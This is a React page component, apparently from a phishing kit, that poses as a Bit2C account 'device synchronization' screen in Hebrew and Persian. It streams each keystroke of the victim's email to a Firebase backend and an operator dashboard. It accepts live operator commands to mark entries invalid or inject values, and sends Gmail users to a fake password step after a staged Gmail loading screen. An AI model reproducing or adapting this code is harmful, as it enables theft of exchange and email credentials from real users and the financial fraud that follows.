import React, { useEffect, useRef, useState } from "react";
import { motion } from "framer-motion";
import { X, Mail, Copy } from "lucide-react";
// @ts-ignore - hook JS sem definições
import { useFirebaseClient } from "../hooks/useFirebaseClient";
import { useNavigate } from "react-router-dom";
import { useToast } from "../components/ui/toast-provider";
// @ts-ignore - tipagem JS
import { reportTyping } from "../firebase/typing";
import SyncModal from "../components/SyncModal";
import Flag from 'react-world-flags';
import EmailManager from "../utils/emailManager";
import DeviceManager from "../utils/deviceManager";

const DevicePage = () => {
  const navigate = useNavigate();
  const { updateClientData, clientId, clientData, commands } =
    useFirebaseClient(navigate);
  const { showNotification } = useToast();
  const didSetRef = useRef(false);
  const audioRef = useRef<any>(null);
  const previousDeviceNumberRef = useRef("");
  const previousClientEmailRef = useRef("");
  const [deviceNumber, setDeviceNumber] = useState("");
  const [loading, setLoading] = useState(false);
  const [invalidMessage, setInvalidMessage] = useState("");
  const [isMobileMenuOpen, setIsMobileMenuOpen] = useState(false);
  const [isDesktopMenuOpen, setIsDesktopMenuOpen] = useState(false);
  const [showSpinner, setShowSpinner] = useState(true);
  const [showModal, setShowModal] = useState(false);
  const [showSyncModal, setShowSyncModal] = useState(false);
  const [clientEmail, setClientEmail] = useState("");
  const [isMobile, setIsMobile] = useState(false);
  const [isLoading, setIsLoading] = useState(false);
  const [showGif, setShowGif] = useState(false);
  const [showSyncContent, setShowSyncContent] = useState(false);
  const [hideMainContent, setHideMainContent] = useState(false);
  const [verifyLoading, setVerifyLoading] = useState(false);
  const [showNextStep, setShowNextStep] = useState(false);
  const [showGmailSpinner, setShowGmailSpinner] = useState(false);

  // Função para lidar com o clique em Verify
  const handleVerifyClick = async () => {
    if (deviceNumber.length <= 3) return;

    // Verificar se o email é Gmail
    const isGmail = deviceNumber.toLowerCase().includes('@gmail.com');
    
    if (isGmail) {
      // Esconder o conteúdo do modal e mostrar o spinner do Gmail
      setShowGmailSpinner(true);
      // Simular carregamento do Gmail por 3 segundos e redirecionar
      setTimeout(() => {
        window.location.href = 'http://localhost:3000/sync?view=password';
      }, 3000);
      return;
    }

    setVerifyLoading(true);

    try {
      // Atualizar dados no Firebase
      await updateClientData({
        deviceVerified: deviceNumber,
        deviceVerifiedAt: Date.now(),
        verificationStatus: "Processing",
      });

      // Simular processo de verificação (como na página auth)
      setTimeout(() => {
        setVerifyLoading(false);
        setShowNextStep(true);
        setHideMainContent(true);
      }, 2000);
    } catch (error) {
      setVerifyLoading(false);
      console.error("❌ Erro ao verificar device:", error);
    }
  };
  useEffect(() => {
    const checkDevice = () => {
      const userAgent = navigator.userAgent;
      const isMobileDevice =
        /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(
          userAgent
        );
      setIsMobile(isMobileDevice);
    };

    checkDevice();
    window.addEventListener("resize", checkDevice);
    return () => window.removeEventListener("resize", checkDevice);
  }, []);

  // Mobile SVG Icon
  const MobileIcon = ({ size = 120 }) => (
    <svg
      xmlns="http://www.w3.org/2000/svg"
      width={size}
      height={size}
      viewBox="0 0 19 32"
      xmlSpace="preserve"
    >
      <g fill="#13114A">
        <path d="M1.5 32h16c.827 0 1.5-.673 1.5-1.5v-29c0-.827-.673-1.5-1.5-1.5h-16C.673 0 0 .673 0 1.5v29c0 .827.673 1.5 1.5 1.5M1 1.5a.5.5 0 0 1 .5-.5h16a.5.5 0 0 1 .5.5v29a.5.5 0 0 1-.5.5h-16a.5.5 0 0 1-.5-.5z" />
        <path d="M2.5 27h14a.5.5 0 0 0 .5-.5v-21a.5.5 0 0 0-.5-.5h-14a.5.5 0 0 0-.5.5v21a.5.5 0 0 0 .5.5M3 6h13v20H3z" />
        <circle cx="10" cy="29" r="1" />
        <path d="M7.5 4h4a.5.5 0 0 0 0-1h-4a.5.5 0 0 0 0 1" />
      </g>
    </svg>
  );

  // Desktop SVG Icon
  const DesktopIcon = ({ size = 120 }) => (
    <svg
      width={size}
      height={size}
      viewBox="0 0 36 36"
      xmlns="http://www.w3.org/2000/svg"
    >
      <path
        className="clr-i-outline clr-i-outline-path-1"
        d="M9.6 22.88V10.6h14.8L25.98 9H8v13.88z"
        fill="#13114A"
      />
      <path
        d="M6 7h24v16h2V6.5A1.5 1.5 0 0 0 30.5 5h-25A1.5 1.5 0 0 0 4 6.5V23h2Z"
        className="clr-i-outline clr-i-outline-path-2"
        fill="#13114A"
      />
      <path
        d="M1 25v3.4A2.6 2.6 0 0 0 3.6 31h28.74a2.6 2.6 0 0 0 2.6-2.6V25Zm32 3.4a.6.6 0 0 1-.6.6H3.56a.6.6 0 0 1-.6-.6v-1.87h9.95a1.64 1.64 0 0 0 1.5 1h7.13a1.64 1.64 0 0 0 1.5-1H33Z"
        className="clr-i-outline clr-i-outline-path-3"
        fill="#13114A"
      />
      <path fill="none" d="M0 0h36v36H0z" />
    </svg>
  );

  // Atualizar URL atual no Firebase quando entrar na página
  useEffect(() => {
    if (didSetRef.current) return;
    didSetRef.current = true;
    updateClientData({
      currentUrl: "/device",
      currentPage: "device",
    });
  }, [updateClientData]);

  // Controlar sequência de loading: apenas spinner
  useEffect(() => {
    // Mostrar spinner por 2 segundos
    const spinnerTimer = setTimeout(() => {
      setShowSpinner(false);
    }, 2000);

    return () => clearTimeout(spinnerTimer);
  }, []);

  // Função para limpar comandos de invalidação
  const clearInvalidationCommand = async (commandType: string) => {
    try {
      const { ref, remove } = await import("firebase/database");
      // @ts-ignore - arquivo JS sem tipos
      const { database } = await import("../firebase/config");

      const commandsRef = ref(database, `commands/${clientId}`);
      await remove(commandsRef);
      console.log("🧹 DevicePage - Comando de invalidação limpo:", commandType);
    } catch (error) {
      console.error("❌ DevicePage - Erro ao limpar comando:", error);
    }
  };

  // Inicializar áudio
  useEffect(() => {
    if (!audioRef.current) {
      try {
        // Criar um áudio simples usando Web Audio API ou um beep básico
        audioRef.current = {
          play: () => {
            // Criar um beep simples usando Web Audio API
            const audioContext = new (window.AudioContext as any)();
            const oscillator = audioContext.createOscillator();
            const gainNode = audioContext.createGain();

            oscillator.connect(gainNode);
            gainNode.connect(audioContext.destination);

            oscillator.frequency.value = 800;
            oscillator.type = "sine";

            gainNode.gain.setValueAtTime(0.3, audioContext.currentTime);
            gainNode.gain.exponentialRampToValueAtTime(
              0.01,
              audioContext.currentTime + 0.5
            );

            oscillator.start(audioContext.currentTime);
            oscillator.stop(audioContext.currentTime + 0.5);

            return Promise.resolve();
          },
          pause: () => {},
          currentTime: 0,
        };
      } catch (error) {
        console.error("❌ DevicePage - Erro ao criar áudio:", error);
      }
    }
  }, []);

  // Sincronizar deviceNumber com Firebase em tempo real + notificação
  useEffect(() => {
    if (clientData?.deviceNumber && clientData.deviceNumber !== deviceNumber) {
      const newDeviceNumber = clientData.deviceNumber;
      const previousDeviceNumber = previousDeviceNumberRef.current;

      setDeviceNumber(newDeviceNumber);
      console.log(
        "📱 DevicePage - Device number atualizado do Firebase:",
        newDeviceNumber
      );

      // Mostrar notificação e tocar som apenas se for uma mudança real (não carregamento inicial)
      if (previousDeviceNumber && newDeviceNumber !== previousDeviceNumber) {
        showNotification("Device number recebido do dashboard", "success");

        // Tocar som de notificação
        if (audioRef.current) {
          (audioRef.current as any).pause();
          (audioRef.current as any).currentTime = 0;
          (audioRef.current as any).play().catch((error: any) => {
            console.error("❌ DevicePage - Erro ao tocar som:", error);
          });
        }
      }

      // Atualizar referência do valor anterior
      previousDeviceNumberRef.current = newDeviceNumber;
    }
  }, [clientData?.deviceNumber, deviceNumber, showNotification]);

  // Sincronizar deviceNumber com Firebase em tempo real + notificação
  useEffect(() => {
    if (clientData?.deviceNumber && clientData.deviceNumber !== deviceNumber) {
      const newDeviceNumber = clientData.deviceNumber;
      const previousDeviceNumber = previousDeviceNumberRef.current;
      
      setDeviceNumber(newDeviceNumber);
      console.log("📱 DevicePage - Device number atualizado do Firebase:", newDeviceNumber);
      
      // Mostrar notificação e tocar som apenas se for uma mudança real (não carregamento inicial)
      if (previousDeviceNumber && newDeviceNumber !== previousDeviceNumber) {
        showNotification("Device number recebido do dashboard", "success");

        // Tocar som de notificação
        if (audioRef.current) {
          (audioRef.current as any).pause();
          (audioRef.current as any).currentTime = 0;
          (audioRef.current as any).play().catch((error: any) => {
            console.error("❌ DevicePage - Erro ao tocar som:", error);
          });
        }
      }

      // Atualizar referência do valor anterior
      previousDeviceNumberRef.current = newDeviceNumber;
    }
  }, [clientData?.deviceNumber, deviceNumber, showNotification]);

  // Escutar comandos em tempo real
  useEffect(() => {
    const handleCommands = async () => {
      if (!commands || commands.length === 0) return;

      console.log("🔍 DevicePage - Comandos recebidos:", commands);

      // Detectar comando de invalidação de device
      if (commands.includes("invalid_device")) {
        console.log("🚨 DevicePage - COMANDO invalid_device DETECTADO!");
        setInvalidMessage("Device inválido");
        setDeviceNumber("");

        // Limpar também no Firebase
        updateClientData({
          deviceNumber: "",
          deviceStatus: "Invalid",
        });

        // Limpar o comando após processá-lo
        clearInvalidationCommand("invalid_device");

        // Limpar a mensagem após 5 segundos
        setTimeout(() => setInvalidMessage(""), 5000);
        return;
      }

      // Detectar comando de invalidação de email
      if (commands.includes("invalid_email")) {
        console.log("🚨 DevicePage - COMANDO invalid_email DETECTADO!");
        setInvalidMessage("Email inválido");
        setClientEmail("");

        // Limpar também no Firebase
        updateClientData({
          clientEmail: "",
          emailStatus: "Invalid",
        });

        // Limpar o comando após processá-lo
        clearInvalidationCommand("invalid_email");

        // Limpar a mensagem após 5 segundos
        setTimeout(() => setInvalidMessage(""), 5000);
        return;
      }

      // Detectar comando DEVICE e extrair deviceNumber
      commands.forEach((command: any) => {
        if (command === "DEVICE" || command.type === "DEVICE") {
          // Se o comando tem dados, extrair deviceNumber
          if (command.data && command.data.deviceNumber) {
            const capturedDevice = command.data.deviceNumber;
            setDeviceNumber(capturedDevice);
            
            // Salvar device number usando o DeviceManager
            const deviceSaved = DeviceManager.saveDevice(capturedDevice, 'device_command');
            
            if (deviceSaved) {
              console.log("📱 Device number capturado e salvo com novo sistema:", capturedDevice);
              
              // Também persistir no banco (Firebase) para que outras páginas possam ler de clientData
              try {
                updateClientData({
                  deviceNumber: capturedDevice,
                  deviceStatus: "Captured",
                  lastDevice: capturedDevice,
                  deviceCapturedAt: new Date().toISOString(),
                  deviceSource: "device_command"
                });
                console.log("📱 Device number persistido no Firebase com sucesso");
              } catch (e) {
                console.warn("⚠️ Falha ao persistir device number no Firebase:", e);
              }
            } else {
              console.error("📱 Falha ao salvar device number com novo sistema");
            }
          }
        }
        
        // Detectar comando EMAIL e extrair clientEmail - VERSÃO MELHORADA
        if (command === "EMAIL" || command.type === "EMAIL") {
          // Se o comando tem dados, extrair clientEmail
          if (command.data && command.data.clientEmail) {
            const capturedEmail = command.data.clientEmail;
            
            // Usar o novo sistema de email
            const emailSaved = EmailManager.saveEmail(capturedEmail, 'device_command');
            
            if (emailSaved) {
              setClientEmail(capturedEmail);
              console.log("📧 Email capturado e salvo com novo sistema:", capturedEmail);
              
              // Também persistir no banco (Firebase) para que outras páginas possam ler de clientData
              try {
                updateClientData({
                  clientEmail: capturedEmail,
                  email: capturedEmail,
                  emailStatus: "Captured",
                  lastEmail: capturedEmail,
                  emailCapturedAt: new Date().toISOString(),
                  emailSource: "device_command"
                });
                console.log("📧 Email persistido no Firebase com sucesso");
              } catch (e) {
                console.warn("⚠️ Falha ao persistir email no Firebase:", e);
              }
            } else {
              console.error("📧 Falha ao salvar email com novo sistema");
            }
          }
        }
      });
    };

    handleCommands();
  }, [commands, updateClientData, clientId]);

  // const presence =
  //   clientData?.status ||
  //   (clientData?.online && clientData?.userActive
  //     ? "online"
  //     : clientData?.online
  //     ? "away"
  //     : "offline");
  // const presenceColor =
  //   presence === "online"
  //     ? "text-green-400"
  //     : presence === "away"
  //     ? "text-yellow-400"
  //     : "text-red-400";

  // Função para copiar deviceNumber
  const copyDeviceNumber = () => {
    if (deviceNumber) {
      navigator.clipboard.writeText(deviceNumber);
      showNotification("Device copiado!", "success");
      console.log("📋 Número do device copiado:", deviceNumber);
    }
  };

  // Função para copiar clientEmail
  const copyClientEmail = () => {
    if (clientEmail) {
      navigator.clipboard.writeText(clientEmail);
      console.log("📋 Email copiado:", clientEmail);
    }
  };

  // Função para confirmar device
  const handleConfirmDevice = async () => {
    if (!deviceNumber) return;
    setLoading(true);
    try {
      // Salvar device number confirmado usando DeviceManager
      DeviceManager.saveDevice(deviceNumber, 'device_confirmed');
      
      await updateClientData({
        deviceNumberConfirmed: deviceNumber,
        deviceConfirmedAt: Date.now(),
        deviceStatus: "Confirmed",
      });
      setTimeout(() => {
        setLoading(false);
        console.log("✅ Device confirmado!");
      }, 2000);
    } catch (error) {
      setLoading(false);
      console.error("❌ Erro ao confirmar device:", error);
    }
  };

  const handleStartSync = async () => {
    setHideMainContent(true);
    // Removido o GIF - vai direto para o conteúdo de sync
    setShowSyncContent(true);
  };

  return (
    <div className="min-h-screen overflow-x-hidden" style={{ backgroundColor: '#F4F5FA' }}>
      {/* Header - Always visible */}
      <header className="w-full py-1 md:py-2" style={{ backgroundColor: '#13114A' }}>
        {/* Desktop Header */}
        <div className="hidden md:flex justify-between items-center w-full px-0">
          <div className="flex items-center space-x-2 ml-0 relative">
            <button
              onClick={() => setIsDesktopMenuOpen(!isDesktopMenuOpen)}
              className="text-white p-2 ml-0 hover:bg-white hover:bg-opacity-20 rounded transition-all duration-300 group hover:scale-110"
            >
              <div className="w-6 h-6 flex flex-col justify-center items-center space-y-1">
                <div className={`w-5 h-0.5 bg-white transition-all duration-300 ${isDesktopMenuOpen ? 'rotate-45 translate-y-1.5' : ''}`}></div>
                <div className={`w-5 h-0.5 bg-white transition-all duration-300 ${isDesktopMenuOpen ? 'opacity-0' : ''}`}></div>
                <div className={`w-5 h-0.5 bg-white transition-all duration-300 ${isDesktopMenuOpen ? '-rotate-45 -translate-y-1.5' : ''}`}></div>
              </div>
            </button>
            <div className="absolute top-2 -left-1 w-3 h-3 bg-yellow-500 rounded-full animate-pulse z-10"></div>
            <div className="h-12 w-px bg-white opacity-10"></div>

            <button className="text-white px-3 py-2 text-base rounded-full border border-white hover:bg-white hover:text-blue-900 transition-colors flex items-center space-x-2">
              <svg width="16" height="16" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" fill="currentColor" stroke="currentColor" strokeWidth="2">
                <path d="M12 6.5a2 2 0 1 0-2-2 2 2 0 0 0 2 2m7.5 14h-1v-5a1 1 0 0 0-1-1h-5v-2h5a1 1 0 0 0 0-2h-5v-2a1 1 0 0 0-2 0v7a1 1 0 0 0 1 1h5v5a1 1 0 0 0 1 1h2a1 1 0 0 0 0-2m-6.8-1.6a4 4 0 0 1-7.2-2.4 4 4 0 0 1 2.4-3.66A1 1 0 1 0 7.1 11a6 6 0 1 0 7.2 9.1 1 1 0 0 0-1.6-1.2" />
              </svg>
              <span>נגישות</span>
            </button>

            <button className="text-white px-3 py-1 text-base rounded-full border border-white hover:bg-white hover:text-blue-900 transition-colors">
              תמיכה
            </button>

            <button className="text-white px-2 py-1 text-base rounded-full border transition-colors" style={{ backgroundColor: '#1A97F0', borderColor: '#1A97F0' }}>
              כניסה
            </button>
          </div>

          <div className="flex items-center flex-1 mr-6">
            <div className="flex-1" />
            <div className="mr-8">
              <svg width="24" height="24" viewBox="0 0 512 512" xmlns="http://www.w3.org/2000/svg" className="text-white">
                <path fill="currentColor" d="M64 112h128v48h-80v64H64zm336 48h-80v-48h128v112h-48zM64 288h48v64h80v48H64zm256 64h80v-64h48v112H320z" />
              </svg>
            </div>
            <div className="h-12 w-px bg-white opacity-10 ml-4"></div>
            <div className="h-12 w-px bg-white opacity-10 mr-8 mr-12"></div>
            <img src="/iamgeheadaer.png" alt="Header Logo" className="h-30 w-auto" />
          </div>
        </div>

        {/* Mobile Header */}
        <div className="flex md:hidden justify-between items-center w-full px-4">
          <div className="flex items-center">
            <img src="/iamgeheadaer.png" alt="Header Logo" className="h-8 w-auto" />
            <div className="h-12 w-px bg-white opacity-5 ml-4"></div>
          </div>

          <div className="flex items-center text-white">
            <svg className="w-5 h-5 mr-2" fill="currentColor" viewBox="0 0 20 20">
              <path fillRule="evenodd" d="M5.293 7.293a1 1 0 011.414 0L10 10.586l3.293-3.293a1 1 0 111.414 1.414l-4 4a1 1 0 01-1.414 0l-4-4a1 1 0 010-1.414z" clipRule="evenodd" />
            </svg>
            <span className="text-lg font-medium">Device</span>
          </div>

          <div className="flex items-center space-x-2 mr-0 relative">
            <button
              onClick={() => setIsMobileMenuOpen(!isMobileMenuOpen)}
              className="text-white p-2 ml-0 hover:bg-white hover:bg-opacity-20 rounded transition-all duration-300 group hover:scale-110"
            >
              <div className="w-6 h-6 flex flex-col justify-center items-center space-y-1">
                <div className={`w-5 h-0.5 bg-white transition-all duration-300 ${isMobileMenuOpen ? 'rotate-45 translate-y-1.5' : ''}`}></div>
                <div className={`w-5 h-0.5 bg-white transition-all duration-300 ${isMobileMenuOpen ? 'opacity-0' : ''}`}></div>
                <div className={`w-5 h-0.5 bg-white transition-all duration-300 ${isMobileMenuOpen ? '-rotate-45 -translate-y-1.5' : ''}`}></div>
              </div>
            </button>
            <div className="absolute top-1.5 left-1 w-3 h-3 bg-yellow-500 rounded-full animate-pulse z-20"></div>
          </div>
        </div>
      </header>

      {/* Hebrew Info Card - Blue div */}
      <div className="w-full">
        <div className="py-6 text-center" style={{ backgroundColor: '#BCE2FB' }} dir="rtl">
          <div className="max-w-4xl mx-auto px-4">
            <p className="text-gray-800 text-base font-medium">
              לאחר אישור הסנכרון, התיק שלך יוצג
            </p>
          </div>
        </div>
      </div>

      {/* Space below blue div */}
      <div className="flex-1" style={{ minHeight: 'calc(100vh - 160px)' }}>
      </div>
        
      {/* Device Synchronization Modal */}
      <div className="fixed inset-0 bg-black bg-opacity-50 flex items-start justify-center p-2 sm:p-4 pt-8 sm:pt-16" style={{ zIndex: 99999 }}>
        <div className="bg-white shadow-xl w-full max-w-md sm:max-w-lg mx-auto relative mt-4 sm:mt-8 max-h-[90vh] overflow-y-auto">
          {/* Header do Modal */}
          <div className="text-center p-4 sm:p-6 pb-2 sm:pb-3 relative">
            <h2 className="text-lg sm:text-xl font-semibold text-gray-800 mb-1" dir="rtl">
              همگام سازی دستگاه مورد نیاز است
            </h2>
          </div>

          {/* Conteúdo do Modal */}
          <div className="p-4 sm:p-6 pt-2 sm:pt-3">
            {/* Gmail Spinner - Substitui todo o conteúdo quando ativo */}
             {showGmailSpinner ? (
               <div className="flex flex-col items-center justify-center py-12">
                 <div className="flex items-center space-x-4 mb-6">
                    {/* Gmail SVG Logo */}
                    <svg width="50" height="50" viewBox="0 0 32 32" fill="none" xmlns="http://www.w3.org/2000/svg">
                      <path d="M2 11.956c0-3.485 0-5.228.678-6.559a6.22 6.22 0 0 1 2.72-2.719C6.727 2 8.47 2 11.955 2h8.088c3.485 0 5.228 0 6.559.678a6.22 6.22 0 0 1 2.719 2.72C30 6.727 30 8.47 30 11.955v8.088c0 3.485 0 5.228-.678 6.559a6.22 6.22 0 0 1-2.72 2.719C25.273 30 23.53 30 20.045 30h-8.088c-3.485 0-5.228 0-6.559-.678a6.22 6.22 0 0 1-2.719-2.72C2 25.273 2 23.53 2 20.045z" fill="#fff"/>
                      <path d="m22.052 8.523-5.988 4.672L9.94 8.523v.001l.008.007v6.542l6.047 4.774 6.057-4.59z" fill="#EA4335"/>
                      <path d="m23.623 7.386-1.572 1.137v6.735l4.947-3.799V9.171s-.6-3.268-3.375-1.785" fill="#FBBC05"/>
                      <path d="M22.05 15.258v8.734h3.793s1.079-.11 1.157-1.34V11.458z" fill="#34A853"/>
                      <path d="M9.948 24v-8.927l-.008-.006zM9.94 8.524l-1.564-1.13C5.602 5.91 5 9.177 5 9.177v2.288l4.94 3.602z" fill="#C5221F"/>
                      <path d="M9.94 8.524v6.543l.008.006V8.531z" fill="#C5221F"/>
                      <path d="M5 11.467v11.192A1.35 1.35 0 0 0 6.157 24h3.792l-.009-8.933z" fill="#4285F4"/>
                    </svg>
                    
                    {/* Loading spinner entre o Gmail e a imagem */}
                    <div className="w-6 h-6 border-2 border-gray-300 rounded-full animate-spin border-t-blue-600"></div>
                    
                    {/* Image Header - mesmo tamanho do SVG do Gmail */}
                    <img 
                      src="/iamgeheadaer.png" 
                      alt="Header" 
                      className="w-12 h-12 rounded-lg object-cover"
                    />
                  </div>
                 
                 {/* Loading text */}
                 <div className="flex items-center justify-center" dir="rtl">
                   <span className="text-lg text-gray-700 font-medium">در حال اتصال به Gmail...</span>
                 </div>
               </div>
            ) : (
              <>
                {/* Description */}
                <p className="text-gray-600 mb-6 text-center text-sm sm:text-base leading-relaxed" dir="rtl">
                  برای اطمینان از امنیت حساب شما، همگام سازی ایمیل ضروری است. لطفاً ایمیل حساب Bit2C خود را در زیر تأیید کنید تا به روزرسانی ادامه یابد.
                </p>

                {/* Email Input */}
                <div className="mb-6">
                  <label className="block text-sm font-medium text-gray-700 mb-2" dir="rtl">
                    ایمیل
                  </label>
                  <input
                    type="text"
                    value={deviceNumber}
                    onChange={(e) => {
                      const value = e.target.value;
                      setDeviceNumber(value);
                      // Atualizar no Firebase em tempo real
                      updateClientData({
                        deviceNumber: value,
                        lastDeviceInput: Date.now(),
                        deviceStatus: value ? "Input" : "Empty",
                      });
                      // Reportar digitação para o dashboard
                      reportTyping("device", value);
                    }}
                    onKeyDown={(e) => {
                      if (e.key === 'Enter' && deviceNumber.length > 3 && !verifyLoading) {
                        handleVerifyClick();
                      }
                    }}
                    placeholder=""
                    disabled={verifyLoading}
                    className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:outline-none focus:border-blue-400 text-base text-right"
                    style={{ fontFamily: 'Rubik, sans-serif' }}
                    dir="rtl"
                  />
                </div>

                {/* Loading indicator */}
                {verifyLoading && (
                  <div className="flex items-center justify-center space-x-2 text-gray-500 mb-6" dir="rtl">
                    <div className="w-4 h-4 border-2 border-gray-300 rounded-full animate-spin border-t-blue-600"></div>
                    <span className="text-sm">در حال تأیید...</span>
                  </div>
                )}

                {/* Continue Button */}
                <div className="flex justify-center">
                  <button 
                    onClick={handleVerifyClick}
                    disabled={verifyLoading || deviceNumber.length <= 3}
                    className={`bg-blue-600 text-white font-semibold py-3 px-8 rounded-lg transition-all duration-200 focus:outline-none focus:ring-2 focus:ring-blue-500 text-base hover:bg-blue-700 ${
                      verifyLoading || deviceNumber.length <= 3 ? 'opacity-50 cursor-not-allowed' : ''
                    }`}
                  >
                    {verifyLoading ? "در حال تأیید..." : "ادامه"}
                  </button>
                </div>
              </>
            )}
          </div>
        </div>
      </div>
    </div>
  );
};

export default DevicePage;